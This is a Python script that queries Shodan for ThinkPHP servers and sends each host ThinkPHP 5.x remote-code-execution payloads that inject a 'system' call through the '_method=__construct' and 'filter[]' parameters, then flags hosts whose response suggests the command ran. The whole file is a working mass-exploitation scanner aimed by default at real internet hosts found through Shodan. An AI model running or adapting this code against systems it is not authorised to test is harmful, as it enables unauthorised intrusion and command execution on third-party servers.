import re
import requests
from shodan import Shodan

data_5010 = "s=set&filter%5B%5D=system&_method=__construct&method="
data_5023 = "_method=__construct&filter[]=system&method=GET&get[]=set"
data_5152 = "c=system&f=set&&_method=filter&"

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded', 
}

def check5010(url):
    
    r = requests.post(url+"/index.php?s=index/index/index/",data=data_5010,headers=headers,timeout=1)
    result = re.search(r"path=",r.text.replace(" ",""),re.I)
    if result:
        print(url,"5010 Vulnerable")
    else:
        print(url,"5010 Not Vulnerable")

def check5023(url):
    
    r = requests.post(url+"/index.php?s=captcha",data=data_5023,headers=headers,timeout=1)
    result = re.search(r"path=",r.text.replace(" ",""),re.I)
    if result:
        print(url,"5023 Vulnerable")
    else:
        print(url,"5023 Not Vulnerable")
        

def check5152(url):
    r = requests.post(url+"/index.php",data=data_5152,headers=headers,timeout=1)
    result = re.search(r"path=",r.text.replace(" ",""),re.I)
    if result:
        print(url,"5152 Vulnerable")
    else:
        print(url,"5152 Not Vulnerable")
    
def apicheck():  
    api = Shodan('your_api_key')
    try:
        # Search Shodan
        results = api.search('thinkphp')

        # Show the results
        print('Results found: {}'.format(results['total']))
        for result in results['matches']:
                print('IP: {}'.format(result['ip_str']))
                url = "http://" + result['ip_str']
                try:
                    checkall(url)
                except Exception as e:
                    print(e)  
    except Exception as e:
        print('Error: {}'.format(e))

def checkall(url):
    check5010(url)
    check5023(url)
    check5152(url)

if __name__ == "__main__":
    apicheck()
    #url = "http://127.0.0.1/tp511/public"
    #checkall(url)
